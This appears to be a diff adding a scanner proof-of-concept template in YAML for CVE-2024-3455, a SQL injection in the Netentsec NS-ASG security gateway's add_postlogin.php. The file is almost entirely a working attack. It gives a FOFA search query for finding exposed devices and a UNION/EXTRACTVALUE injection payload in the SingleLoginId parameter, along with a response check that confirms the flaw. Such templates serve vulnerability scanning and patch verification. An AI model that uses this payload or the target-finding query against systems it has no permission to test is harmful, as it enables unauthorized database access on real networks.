@@ -1,0 +1,23 @@
+id: poc-yaml-netent-ns-asg-add-postlogin-php-sqli
+info:
+  name: 网康科技NS-ASG应用安全网关 add_postlogin.php SQL注入漏洞(CVE-2024-3455)
+  severity: high
+  tags:
+  - CVE-2024-3455
+  - SQL注入
+  finger: ns-asg
+  fofa: title="网康-NS-ASG-应用安全网关"
+variables:
+  t1: random_int(1000,9999)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /admin/add_postlogin.php?SingleLoginId=1+UNION+ALL+SELECT+EXTRACTVALUE(1,concat(0x7e,(select+md5({{.t1}})),0x7e))
+  expression: 'status_code == 200 &&
+
+    contains(body,substr(t2,0,31)) &&
+
+    contains(body,"XPATH syntax error")
+
+    '
+transport: http
